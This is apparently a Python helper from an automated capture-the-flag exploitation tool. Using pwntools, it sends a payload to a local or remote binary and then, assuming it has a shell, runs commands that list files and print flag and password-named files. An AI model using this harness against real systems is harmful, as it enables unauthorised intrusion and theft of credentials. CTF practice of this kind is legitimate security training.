from pwn import remote, process


def sendExploit(binary_name, properties, remote_server=False, remote_url="", port_num=0):

    send_results = {}

    # Create local or remote process
    if remote_server:
        print("[=] set remote attack mode")
        proc = remote(remote_url, port_num)
    else:
        print("[=] set local attack mode")
        proc = process(binary_name)

    # Command to send
    input_string = properties["pwn_type"]["results"]["input"]

    proc.sendline(input_string)
    print("useing payload:",repr(input_string))

    # Sometimes the flag is just printed
    results = proc.recvall(timeout=3)
    proc.close()

    send_results["flag_found"] = False
    if b"{" in results and b"}" in results:
        send_results["flag_found"] = True
        print("[+] Flag found:")
        print(results)
    # Flag not in stdout, we have a shell
    else:
        if remote_server:
            proc = remote(remote_url, port_num)
        else:
            proc = process(binary_name)
        proc.sendline(input_string)
        
        proc.sendline()
        proc.sendline("ls;\n")
        proc.sendline("cat *flag*;\n")
        proc.sendline("cat *pass*;\n")
        command_results = proc.recvall(timeout=3)
        print(command_results)
        if b"{" in command_results and b"}" in command_results:
            send_results["flag_found"] = True
            print("[+] Flag found:")
            print(command_results)

    return send_results
